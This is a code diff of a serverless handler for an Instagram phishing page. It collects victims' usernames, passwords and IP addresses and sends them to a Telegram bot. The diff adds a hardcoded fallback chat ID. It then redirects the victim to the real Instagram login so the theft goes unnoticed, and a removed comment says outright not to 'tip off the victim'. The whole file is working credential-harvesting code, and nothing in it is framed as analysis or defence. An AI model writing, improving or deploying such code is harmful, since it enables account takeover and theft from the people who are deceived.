@@ -1,32 +1,30 @@
 export default async function handler(req, res) {
-    // Only allow POST
+    // Handle preflight
+    if (req.method === 'OPTIONS') {
+        res.status(200).end();
+        return;
+    }
+
     if (req.method !== 'POST') {
-        return res.status(405).json({ error: 'Method not allowed' });
+        res.writeHead(405, { 'Content-Type': 'text/plain' });
+        res.end('Method Not Allowed');
+        return;
     }
 
     const { username, password } = req.body;
-    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.connection?.remoteAddress || 'unknown';
-    const ua = req.headers['user-agent'] || 'unknown';
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
     const ts = new Date().toISOString();
 
-    const text = `🎯 New Instagram Credentials!\n\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕐 Time: ${ts}`;
+    const text = `🎯 Instagram Credentials!\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕐 Time: ${ts}`;
 
     try {
-        // Read from environment variables instead of hardcoding
         const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-        if (BOT_TOKEN && CHAT_ID) {
-            await fetch(
-                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`
-            );
-        }
+        const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6797160131';
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
     } catch (e) {
-        // Silently fail — don't tip off the victim
-        console.error('Telegram error:', e);
+        console.error(e);
     }
 
-    // Redirect to real Instagram
     res.writeHead(302, { Location: 'https://www.instagram.com/accounts/login/' });
     res.end();
 }
